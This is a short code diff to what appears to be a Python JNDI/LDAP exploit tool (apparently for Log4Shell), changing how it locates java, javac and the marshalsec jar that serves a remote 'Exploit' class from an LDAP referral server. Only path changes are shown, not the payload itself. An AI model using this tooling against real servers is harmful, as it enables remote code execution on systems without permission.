@@ -58,7 +58,12 @@ public class Exploit {
 
     try:
         p.write_text(program)
-        subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/javac"), str(p)])
+        subprocess.run(
+            [
+                "javac",
+                str(p),
+            ]
+        )
     except OSError as e:
         print(Fore.RED + f"[-] Something went wrong {e}")
         raise e
@@ -84,7 +89,7 @@ def payload(userip: str, webport: int, lport: int) -> None:
 def check_java() -> bool:
     exit_code = subprocess.call(
         [
-            os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
+            "java",
             "-version",
         ],
         stderr=subprocess.DEVNULL,
@@ -100,9 +105,9 @@ def ldap_server(userip: str, lport: int) -> None:
     url = "http://{}:{}/#Exploit".format(userip, lport)
     subprocess.run(
         [
-            os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
+            "java",
             "-cp",
-            os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
+            os.path.join(CUR_FOLDER, "ldap/marshalsec-0.0.3-SNAPSHOT-all.jar"),
             "marshalsec.jndi.LDAPRefServer",
             url,
         ]
